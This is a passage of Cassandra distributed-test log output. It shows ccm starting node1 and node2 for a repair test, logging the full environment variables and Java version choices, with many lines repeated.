'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,9 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,10 ccm INFO node1: using Java 8 for the current invocation
01:32:33 23:32:33,10 ccm INFO node1: using Java 8 for the current invocation
01:32:33 23:32:33,53 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:33 23:32:33,53 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:33 23:32:33,188 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/conf'}
01:32:33 23:32:33,188 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/conf'}
01:32:33 23:32:33,189 ccm INFO node2: using Java 8 for the current invocation
01:32:33 23:32:33,189 ccm INFO node2: using Java 8 for the current invocation
01:32:33 23:32:33,283 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,283 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'e43cedb5cebc', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-9vg8h2z0/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:33 23:32:33,283 ccm INFO node2: using Java 8 for the current invocation
01:32:33 23:32:33,283 ccm INFO node2: using Java 8 for the current invocation
01:32:33 23:32:33,342 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:33 23:32:33,342 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
